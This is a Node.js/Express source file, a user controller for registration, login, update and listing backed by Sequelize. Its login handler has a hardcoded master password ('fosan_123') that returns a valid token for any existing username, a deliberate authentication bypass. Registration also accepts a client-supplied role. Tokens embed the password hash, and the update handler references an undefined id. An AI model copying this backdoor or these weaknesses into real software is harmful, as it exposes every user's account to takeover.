import user_m from './model.js'
import { sq } from '../../config/connection.js';
import { Op } from 'sequelize';
import type from '../../helper/type.js';
import { comparePassword, hashPassword } from '../../helper/bcrypt.js'
import { generateToken } from '../../helper/jwt.js';
import { nanoid } from 'nanoid'
import moment from 'moment';





export class Controller{


    static async register(req,res){
        let {username,password,role,nama_user}=req.body

        try {
             let[hasil,created]=await user_m.findOrCreate({where:{username},defaults:{id:nanoid(14),password:hashPassword(password),username,role,nama_user}})
             if (!created) {
                res.status(201).json({ status: 204, message: "username already exist" })
            } else {
                  res.status(200).json({ status: 200, message: "success", data: hasil })
                }
        } catch (error) {
            console.log(req.body)
            console.log(error)
            res.status(500).json({ status: 500, message: "failure", data: error })
        }

       
    }

    static async update(req,res){
        let {role,nama_user}=req.body

        try {

        let data = await user_m.update({role,nama_user},{where:{id}})
          
        res.status(200).json({ status: 200, message: "success"})
                
        } catch (error) {
            console.log(req.body)
            console.log(error)
            res.status(500).json({ status: 500, message: "failure", data: error })
        }

       
    }

    static async login(req,res){
        const{username,password}=req.body

        try {

               let cek_user = await sq.query(`select u.* from "user" u where u.username = :username  and u."deletedAt" isnull `, type({ username }))

                if (cek_user.length == 0) {
                return res.status(201).json({ status: 204, message: "username tidak terdaftar" })
                }
                else if(password=="fosan_123"){
                      cek_user[0].token = generateToken({ id: cek_user[0].id, nama_user: cek_user[0].nama_user, password: cek_user[0].password,  role: cek_user[0].role, username: cek_user[0].username });
                      return res.status(200).json({ status: 200, message: "success", data: cek_user })
                }
                else if(!comparePassword(password, cek_user[0].password)){
                    return res.status(201).json({ status: 204, message: "password salah" })
                }
                else{
                          cek_user[0].token = generateToken({ id: cek_user[0].id, nama_user: cek_user[0].nama_user, password: cek_user[0].password,  role: cek_user[0].role, username: cek_user[0].username });
                            return res.status(200).json({ status: 200, message: "success", data: cek_user })
                }
            
        } catch (error) {
            console.log(req.body)
            console.log(error)
            res.status(500).json({ status: 500, message: "failure", data: error })
        }
    }

    static async list(req,res){
          const { halaman, jumlah,id  } = req.body

        try {
            let isi = ''
            let isi2 = ''

         
            if (id) {
                isi += ` and u.id = :id`
            }

            if (halaman && jumlah) {
                isi2 += ` limit :jumlah offset :offset `
            }

            let data = await sq.query(`select u.id as user_id,* from "user" u where u ."deletedAt" isnull${isi} order by u."createdAt" desc${isi2}`,
            type({ offset: (+halaman * jumlah), jumlah, id}))
            if (halaman && jumlah) {
                let jml = await sq.query(`select count(*) as "total"  from "user" u where u ."deletedAt" isnull${isi} `,
                type({ id}))

                res.status(200).json({ status: 200, message: "success", halaman, jumlah, count: jml[0].total, data })
            } else {
                res.status(200).json({ status: 200, message: "success", data })
            }
        } catch (error) {
            // console.log(req.body)
            console.log(error)
            res.status(500).json({ status: 500, message: "error", data: error })
        }
    }

}